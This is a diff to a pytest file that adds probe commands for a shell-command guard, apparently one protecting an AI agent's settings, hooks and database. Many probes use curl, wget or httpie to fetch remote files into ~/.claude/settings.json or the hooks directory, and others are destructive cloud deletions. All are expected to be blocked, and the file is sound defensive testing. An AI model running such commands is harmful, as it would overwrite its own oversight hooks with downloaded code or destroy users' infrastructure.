@@ -214,6 +214,99 @@ PROBES += [
     ("gcloud-logging-logs-list", "gcloud logging logs list", "FREE"),
     ("gcloud-runtime-config-list", "gcloud runtime-config configs list", "FREE"),
     ("aws-timestream-query-describe", "aws timestream-query describe-endpoints", "FREE"),
+    ("aws-ecr-batch-delete-control", "aws ecr batch-delete-image --repository-name r --image-ids imageTag=x", "SIGNED"),
+]
+
+CS = f"{HOME}/.claude/settings.json"
+CH = f"{HOME}/.claude/hooks"
+DB = f"{HOME}/.gaia/gaia.db"
+PROBES += [
+    ("curl-bundled-sSLo-claude", f"curl -sSLo {CS} {U}", "BLOCKED"),
+    ("curl-bundled-so-gaia-db", f"curl -so {DB} {U}", "BLOCKED"),
+    ("curl-tilde-o-claude", f"curl -o ~/.claude/settings.json {U}", "BLOCKED"),
+    ("curl-HOME-o-claude", f"curl -o $HOME/.claude/settings.json {U}", "BLOCKED"),
+    ("curl-HOME-quoted-o-claude", f'curl -o "$HOME/.claude/settings.json" {U}', "BLOCKED"),
+    ("curl-output-dir-o-claude", f"curl --output-dir {HOME}/.claude -o settings.json {U}", "BLOCKED"),
+    ("curl-output-dir-O-hooks", f"curl --output-dir {CH} -O https://example.invalid/x.py", "BLOCKED"),
+    ("curl-create-dirs-o-hooks", f"curl --create-dirs -o {CH}/new/x.py {U}", "BLOCKED"),
+    ("curl-create-dirs-o-hooks-scheme-in-path", f"curl --create-dirs -o {CH}/x://y.py {U}", "BLOCKED"),
+    ("curl-cd-claude-o-relative", f"cd {HOME}/.claude && curl -o settings.json {U}", "BLOCKED"),
+    ("curl-cd-hooks-O-basename", f"cd {CH} && curl -O https://example.invalid/x.py", "BLOCKED"),
+    ("curl-cd-hooks-remote-name-all", f"cd {CH} && curl --remote-name-all https://example.invalid/x.py", "BLOCKED"),
+    ("curl-cd-gaia-O-db", f"cd {HOME}/.gaia && curl -O https://example.invalid/gaia.db", "BLOCKED"),
+    ("curl-output-dir-gaia-O-db", f"curl --output-dir {HOME}/.gaia -O https://example.invalid/gaia.db", "BLOCKED"),
+    ("curl-dump-header-claude", f"curl -D {CS} {U}", "BLOCKED"),
+    ("curl-cookie-jar-claude", f"curl -c {CS} {U}", "BLOCKED"),
+    ("curl-trace-hooks", f"curl --trace {CH}/x.py {U}", "BLOCKED"),
+    ("curl-stderr-gaia-db", f"curl --stderr {DB} {U}", "BLOCKED"),
+    ("curl-etag-save-claude", f"curl --etag-save {CS} {U}", "BLOCKED"),
+    ("curl-hsts-eq-claude", f"curl --hsts={CS} {U}", "BLOCKED"),
+    ("curl-alt-svc-claude", f"curl --alt-svc {CS} {U}", "BLOCKED"),
+    ("curl-o-stdout-dash-attached", f"curl -o- {U}", "FREE"),
+    ("curl-o-stdout-dash", f"curl -o - {U}", "FREE"),
+    ("curl-o-local-file", f"curl -o out.json {U}", "FREE"),
+    ("curl-cd-hooks-stdout", f"cd {CH} && curl -sS {U}", "FREE"),
+    ("curl-header-unresolved-variable", f'curl -H "Authorization: Bearer $TOKEN" {U}', "FREE"),
+    ("wget-O-claude", f"wget -O {CS} {U}", "BLOCKED"),
+    ("wget-qO-bundled-claude", f"wget -qO {CS} {U}", "BLOCKED"),
+    ("wget-output-document-eq-claude", f"wget --output-document={CS} {U}", "BLOCKED"),
+    ("wget-output-doc-abbrev-claude", f"wget --output-doc={CS} {U}", "BLOCKED"),
+    ("wget-P-hooks", f"wget -P {CH} https://example.invalid/x.py", "BLOCKED"),
+    ("wget-directory-prefix-hooks", f"wget --directory-prefix={CH} https://example.invalid/x.py", "BLOCKED"),
+    ("wget-cd-hooks-bare", f"cd {CH} && wget https://example.invalid/x.py", "BLOCKED"),
+    ("wget-append-output-claude", f"wget -a {CS} {U}", "BLOCKED"),
+    ("wget-o-logfile-claude", f"wget -o {CS} {U}", "BLOCKED"),
+    ("wget-O-gaia-db", f"wget -O {DB} {U}", "BLOCKED"),
+    ("wget-P-gaia-db", f"wget -P {HOME}/.gaia https://example.invalid/gaia.db", "BLOCKED"),
+    ("wget-O-stdout", f"wget -O- {U}", "FREE"),
+    ("wget-qO-stdout", f"wget -qO- {U}", "FREE"),
+    ("httpie-download-cd-hooks", f"cd {CH} && http --download https://example.invalid/x.py", "BLOCKED"),
+    ("httpie-o-claude", f"http -o {CS} {U}", "BLOCKED"),
+    ("curl-G-H-at-before-d", f"curl -G -H @h.txt -d q=x {U}", "SIGNED"),
+    ("curl-G-header-at-long", f"curl -G --header @h.txt -d q=x {U}", "SIGNED"),
+    ("curl-G-H-at-attached", f"curl -G -H@h.txt -d q=x {U}", "SIGNED"),
+    ("curl-G-H-at-after-url", f"curl -G -d q=x {U} -H @h.txt", "SIGNED"),
+    ("curl-H-at-then-G", f"curl -H @h.txt -G -d q=x {U}", "SIGNED"),
+    ("curl-G-H-plain-then-at", f"curl -G -H 'A: b' -H @h.txt -d q=x {U}", "SIGNED"),
+    ("curl-G-H-plain-read", f"curl -G -H 'Accept: application/json' -d q=x {U}", "FREE"),
+    ("curl-G-sSLo-claude", f"curl -G -d q=x -sSLo {CS} {U}", "BLOCKED"),
+    ("curl-G-so-gaia-db", f"curl -G -d q=x -so {DB} {U}", "BLOCKED"),
+    ("curl-G-tilde-o-claude", f"curl -G -d q=x -o ~/.claude/settings.json {U}", "BLOCKED"),
+    ("curl-G-output-dir-o-claude", f"curl -G -d q=x --output-dir {HOME}/.claude -o settings.json {U}", "BLOCKED"),
+    ("curl-G-cd-hooks-o-relative", f"cd {CH} && curl -G -d q=x -o x.py {U}", "BLOCKED"),
+    ("curl-G-o-attached-claude", f"curl -G -d q=x -o{CS} {U}", "BLOCKED"),
+    ("curl-G-dash-dash-output-eq", f"curl -G -d q=x --output={CS} {U}", "BLOCKED"),
+    ("aws-get-policy-value-delete", "aws s3api get-bucket-policy --bucket delete", "FREE"),
+    ("aws-describe-value-put", "aws logs describe-log-groups --log-group-name-prefix put", "FREE"),
+    ("aws-profile-delete-s3-ls", "aws --profile delete s3 ls", "FREE"),
+    ("aws-region-eq-create-ec2-describe", "aws --region=create ec2 describe-instances", "FREE"),
+    ("aws-ec2-describe-filter-create", "aws ec2 describe-instances --filters Name=tag:x,Values=create", "FREE"),
+    ("aws-debug-s3-ls", "aws --debug s3 ls", "FREE"),
+    ("gcloud-project-delete-list", "gcloud --project delete compute instances list", "FREE"),
+    ("gcloud-verbosity-delete-list", "gcloud --verbosity delete compute instances list", "FREE"),
+    ("gcloud-list-filter-create", "gcloud compute instances list --filter create", "FREE"),
+    ("gcloud-describe-zone-delete", "gcloud compute instances describe vm1 --zone delete", "FREE"),
+    ("gcloud-describe-name-config", "gcloud compute instances describe config", "FREE"),
+    ("gcloud-instances-list-config-positional", "gcloud compute instances list config", "FREE"),
+    ("aws-s3-ls-config", "aws s3 ls s3://b/config", "FREE"),
+    ("az-subscription-create-vm-list", "az --subscription create vm list", "FREE"),
+    ("az-output-delete-vm-list", "az -o delete vm list", "FREE"),
+    ("az-vm-list-query-put", "az vm list --query put", "FREE"),
+    ("az-vm-show-name-create", "az vm show -n create -g r", "FREE"),
+    ("az-show-name-delete", "az storage account show -n delete -g create", "BLOCKED"),
+    ("az-vm-show-name-delete", "az vm show -n delete -g r", "BLOCKED"),
+    ("aws-profile-list-s3-rm", "aws --profile list s3 rm s3://b/k", "SIGNED"),
+    ("aws-profile-get-s3-cp", "aws --profile get s3 cp a s3://b/k", "SIGNED"),
+    ("aws-unknown-option-list-s3-rm", "aws --frobnicate list s3 rm s3://b/k", "SIGNED"),
+    ("aws-delete-sg-value-list", "aws ec2 delete-security-group --group-name list", "SIGNED"),
+    ("aws-region-eq-get-sqs-purge", "aws --region=get sqs purge-queue --queue-url q", "SIGNED"),
+    ("gcloud-project-list-delete", "gcloud --project list compute instances delete vm1", "SIGNED"),
+    ("gcloud-account-list-run-deploy", "gcloud --account list run deploy svc --image i", "SIGNED"),
+    ("gcloud-delete-zone-describe", "gcloud compute instances delete vm1 --zone describe", "SIGNED"),
+    ("az-subscription-list-alert-delete", "az --subscription list monitor activity-log alert delete -n x -g r", "SIGNED"),
+    ("az-group-delete-n-show", "az group delete -n show", "BLOCKED"),
+    ("az-subscription-list-vm-delete", "az --subscription list vm delete -n v -g r", "BLOCKED"),
+    ("aws-ec2-terminate-plain", "aws ec2 terminate-instances --instance-ids i-123", "BLOCKED"),
 ]
 
 
@@ -256,3 +349,12 @@ def test_probe_ids_are_unique():
 def test_probe(probe_id, command, expected, isolated):
     verdict, reason = _observe(command, isolated)
     assert verdict == expected, f"{verdict} :: {command} :: {reason[:120]}"
+
+
+@pytest.mark.parametrize("form", ["o", "cd"])
+def test_symlinked_dir_into_claude(form, isolated):
+    link = isolated / "lnk"
+    link.symlink_to(Path(HOME) / ".claude")
+    command = f"curl -o {link}/settings.json {U}" if form == "o" else f"cd {link} && curl -o settings.json {U}"
+    verdict, reason = _observe(command, isolated)
+    assert verdict == "BLOCKED", f"{verdict} :: {reason[:120]}"
